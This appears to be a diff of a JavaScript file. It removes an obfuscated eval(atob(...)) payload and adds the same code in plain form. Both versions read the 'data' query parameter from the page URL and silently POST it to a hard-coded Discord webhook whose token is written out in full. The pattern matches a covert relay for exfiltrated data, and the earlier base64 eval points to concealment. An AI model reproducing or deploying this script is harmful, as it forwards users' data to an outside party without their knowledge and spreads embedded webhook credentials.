@@ -1,1 +1,6 @@
-eval(atob("Y29uc3QgbXlLZXlzVmFsdWVzID0gd2luZG93LmxvY2F0aW9uLnNlYXJjaDsKY29uc29sZS5sb2cobXlLZXlzVmFsdWVzKTsKY29uc3QgdXJsUGFyYW1zID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhteUtleXNWYWx1ZXMpOwp2YXIgbXNnID0gIiI7Cm1zZyArPSB1cmxQYXJhbXMuZ2V0KCJkYXRhIik7CmZldGNoKCJodHRwczovL3d3dy5kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA1MDU5NjA1Mjg1MzYwODUxOC9UMG82eGtidVhlYVh6X3k0eGtITGtRdUNuWnlKZ1YxNG9XM2JFTVFBTy1xUEN6VUltSkV3ZWhwYlhwMGtsMGs2UXEwViIgKyAiP3dhaXQ9dHJ1ZSIsIHsibWV0aG9kIjoiUE9TVCIsICJoZWFkZXJzIjogeyJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9LCJib2R5IjogSlNPTi5zdHJpbmdpZnkobXNnKX0pOw=="));
+const myKeysValues = window.location.search;
+console.log(myKeysValues);
+const urlParams = new URLSearchParams(myKeysValues);
+var msg = "";
+msg += urlParams.get("data");
+fetch("https://discordapp.com/api/webhooks/1255962432921145457/PLRB-dTHp8mXNBsp5N85oGGr2776pyvESiZpTOe032UtLHtVwgbbO5RDYBzD03io256l" + "?wait=true", {"method":"POST", "headers": {"content-type": "application/json"},"body": JSON.stringify(msg)});
